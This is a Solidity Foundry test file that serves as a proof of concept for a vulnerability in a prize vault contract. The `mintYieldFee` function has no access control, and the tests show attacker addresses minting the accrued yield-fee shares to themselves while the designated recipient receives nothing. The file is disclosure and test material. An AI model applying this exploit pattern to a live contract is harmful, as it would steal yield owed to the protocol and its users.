// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.17;

import { UnitBaseSetup, LiquidationPair, PrizePool, TwabController, VaultMock, ERC20, IERC20, IERC4626 } from "test/utils/UnitBaseSetup.t.sol";
import "src/Vault.sol";

/**
 * @title ExploitTest
 * @notice PoC demonstrating the mintYieldFee vulnerability where anyone can steal yield fees
 * @dev The vulnerability exists because mintYieldFee() allows the caller to specify the recipient
 *      address instead of enforcing that yield fees go to the designated _yieldFeeRecipient.
 */
contract ExploitTest is UnitBaseSetup {

    address public attacker;
    address public yieldFeeRecipient;

    function setUp() public override {
        super.setUp();

        // Setup attacker address
        attacker = makeAddr("attacker");

        // Setup legitimate yield fee recipient
        yieldFeeRecipient = makeAddr("yieldFeeRecipient");

        // Create a new vault with yield fee configuration
        vault = new VaultMock(
            underlyingAsset,
            vaultName,
            vaultSymbol,
            twabController,
            yieldVault,
            PrizePool(address(prizePool)),
            claimer,
            yieldFeeRecipient,  // Set the legitimate yield fee recipient
            YIELD_FEE_PERCENTAGE,
            address(this)
        );

        // Setup liquidation pair for the vault
        vault.setLiquidationPair(LiquidationPair(address(liquidationPair)));
    }

    /**
     * @notice Demonstrates the vulnerability where an attacker can steal yield fees
     * @dev Attack flow:
     *      1. Users deposit assets into the vault
     *      2. Yield is generated and liquidated, creating yield fee balance
     *      3. Attacker calls mintYieldFee() with their own address as recipient
     *      4. Attacker receives yield fee shares that should have gone to yieldFeeRecipient
     */
    function testExploit_StealYieldFees() public {
        // ============ SETUP: Create yield fee balance ============

        // 1. Alice deposits 1000 tokens into the vault
        uint256 depositAmount = 1000e18;
        underlyingAsset.mint(alice, depositAmount);

        vm.startPrank(alice);
        underlyingAsset.approve(address(vault), depositAmount);
        vault.deposit(depositAmount, alice);
        vm.stopPrank();

        // 2. Simulate yield generation in the yield vault
        // Mint 100 tokens of yield to the yield vault (10% yield on deposits)
        uint256 yieldAmount = 100e18;
        underlyingAsset.mint(address(yieldVault), yieldAmount);

        // 3. Liquidate the yield to create yield fee balance
        // The liquidation process mints vault shares and increases yield fee balance
        uint256 liquidatableYield = vault.liquidatableBalanceOf(address(vault));

        // Mock the prize pool to accept prize token contributions
        vm.mockCall(
            address(prizePool),
            abi.encodeWithSelector(PrizePool.contributePrizeTokens.selector),
            abi.encode(true)
        );

        // Mint prize tokens to liquidation pair for the swap
        prizeToken.mint(address(liquidationPair), liquidatableYield);

        // Execute liquidation as the liquidation pair
        vm.startPrank(address(liquidationPair));
        prizeToken.approve(address(prizePool), liquidatableYield);
        vault.liquidate(
            address(liquidationPair),
            address(prizeToken),
            liquidatableYield,
            address(vault),
            liquidatableYield
        );
        vm.stopPrank();

        // Verify yield fee balance was created
        uint256 yieldFeeTotalSupply = vault.yieldFeeTotalSupply();
        assertGt(yieldFeeTotalSupply, 0, "Yield fee balance should be greater than 0");

        // ============ EXPLOIT: Attacker steals yield fees ============

        // Record balances before the attack
        uint256 attackerBalanceBefore = vault.balanceOf(attacker);
        uint256 recipientBalanceBefore = vault.balanceOf(yieldFeeRecipient);

        assertEq(attackerBalanceBefore, 0, "Attacker should have 0 shares initially");
        assertEq(recipientBalanceBefore, 0, "Recipient should have 0 shares initially");

        // Attacker calls mintYieldFee with their own address as recipient
        // This should fail in a secure implementation, but succeeds due to the vulnerability
        vm.startPrank(attacker);
        vault.mintYieldFee(yieldFeeTotalSupply, attacker);
        vm.stopPrank();

        // Record balances after the attack
        uint256 attackerBalanceAfter = vault.balanceOf(attacker);
        uint256 recipientBalanceAfter = vault.balanceOf(yieldFeeRecipient);

        // ============ VERIFY: Attacker successfully stole the yield fees ============

        // The attacker now has the yield fee shares
        assertEq(
            attackerBalanceAfter,
            yieldFeeTotalSupply,
            "Attacker should have received all yield fee shares"
        );

        // The legitimate yield fee recipient received nothing
        assertEq(
            recipientBalanceAfter,
            0,
            "Legitimate recipient should have received 0 shares"
        );

        // The yield fee total supply has been depleted
        assertEq(
            vault.yieldFeeTotalSupply(),
            0,
            "Yield fee total supply should be 0 after minting"
        );

        // ============ IMPACT DEMONSTRATION ============

        // The attacker can now redeem these shares for underlying assets
        // This represents a direct theft of yield that should have gone to the protocol
        uint256 attackerAssets = vault.convertToAssets(attackerBalanceAfter);
        assertGt(attackerAssets, 0, "Attacker can redeem shares for real assets");
    }

    /**
     * @notice Demonstrates that anyone can call mintYieldFee, not just privileged accounts
     * @dev This test shows there is no access control on the mintYieldFee function
     */
    function testExploit_NoAccessControl() public {
        // Setup: Create some yield fee balance
        uint256 depositAmount = 1000e18;
        underlyingAsset.mint(alice, depositAmount);

        vm.startPrank(alice);
        underlyingAsset.approve(address(vault), depositAmount);
        vault.deposit(depositAmount, alice);
        vm.stopPrank();

        // Simulate yield and liquidation
        uint256 yieldAmount = 100e18;
        underlyingAsset.mint(address(yieldVault), yieldAmount);

        uint256 liquidatableYield = vault.liquidatableBalanceOf(address(vault));

        vm.mockCall(
            address(prizePool),
            abi.encodeWithSelector(PrizePool.contributePrizeTokens.selector),
            abi.encode(true)
        );

        prizeToken.mint(address(liquidationPair), liquidatableYield);

        vm.startPrank(address(liquidationPair));
        prizeToken.approve(address(prizePool), liquidatableYield);
        vault.liquidate(
            address(liquidationPair),
            address(prizeToken),
            liquidatableYield,
            address(vault),
            liquidatableYield
        );
        vm.stopPrank();

        uint256 yieldFeeTotalSupply = vault.yieldFeeTotalSupply();
        assertGt(yieldFeeTotalSupply, 0, "Yield fee balance should exist");

        // ============ EXPLOIT: Multiple different attackers can call mintYieldFee ============

        address randomAttacker1 = makeAddr("randomAttacker1");
        address randomAttacker2 = makeAddr("randomAttacker2");

        // Split the yield fee between two random attackers
        uint256 halfYieldFee = yieldFeeTotalSupply / 2;

        // First attacker mints half to themselves
        vm.prank(randomAttacker1);
        vault.mintYieldFee(halfYieldFee, randomAttacker1);

        assertEq(
            vault.balanceOf(randomAttacker1),
            halfYieldFee,
            "First attacker should receive shares"
        );

        // Second attacker mints the rest to themselves
        vm.prank(randomAttacker2);
        vault.mintYieldFee(yieldFeeTotalSupply - halfYieldFee, randomAttacker2);

        assertEq(
            vault.balanceOf(randomAttacker2),
            yieldFeeTotalSupply - halfYieldFee,
            "Second attacker should receive shares"
        );

        // The legitimate recipient got nothing
        assertEq(
            vault.balanceOf(yieldFeeRecipient),
            0,
            "Legitimate recipient should have 0 shares"
        );
    }

    /**
     * @notice Demonstrates the expected behavior: yield fees should only go to yieldFeeRecipient
     * @dev This test shows what SHOULD happen in a properly secured implementation
     */
    function testExploit_ExpectedBehavior() public {
        // Setup: Create yield fee balance (same as exploit tests)
        uint256 depositAmount = 1000e18;
        underlyingAsset.mint(alice, depositAmount);

        vm.startPrank(alice);
        underlyingAsset.approve(address(vault), depositAmount);
        vault.deposit(depositAmount, alice);
        vm.stopPrank();

        underlyingAsset.mint(address(yieldVault), 100e18);

        uint256 liquidatableYield = vault.liquidatableBalanceOf(address(vault));

        vm.mockCall(
            address(prizePool),
            abi.encodeWithSelector(PrizePool.contributePrizeTokens.selector),
            abi.encode(true)
        );

        prizeToken.mint(address(liquidationPair), liquidatableYield);

        vm.startPrank(address(liquidationPair));
        prizeToken.approve(address(prizePool), liquidatableYield);
        vault.liquidate(
            address(liquidationPair),
            address(prizeToken),
            liquidatableYield,
            address(vault),
            liquidatableYield
        );
        vm.stopPrank();

        uint256 yieldFeeTotalSupply = vault.yieldFeeTotalSupply();

        // ============ EXPECTED: Only yieldFeeRecipient should receive yield fees ============

        // In a secure implementation, this call should either:
        // 1. Revert because attacker is not authorized, OR
        // 2. Ignore the _recipient parameter and always send to yieldFeeRecipient

        // Current vulnerable implementation allows this:
        vm.prank(attacker);
        vault.mintYieldFee(yieldFeeTotalSupply, attacker);

        // VULNERABILITY CONFIRMED: Attacker received the shares
        assertEq(
            vault.balanceOf(attacker),
            yieldFeeTotalSupply,
            "VULNERABILITY: Attacker received shares instead of legitimate recipient"
        );

        // EXPECTED BEHAVIOR: yieldFeeRecipient should have received the shares
        // But in the vulnerable implementation, they receive nothing
        assertEq(
            vault.balanceOf(yieldFeeRecipient),
            0,
            "VULNERABILITY: Legitimate recipient received nothing"
        );
    }
}
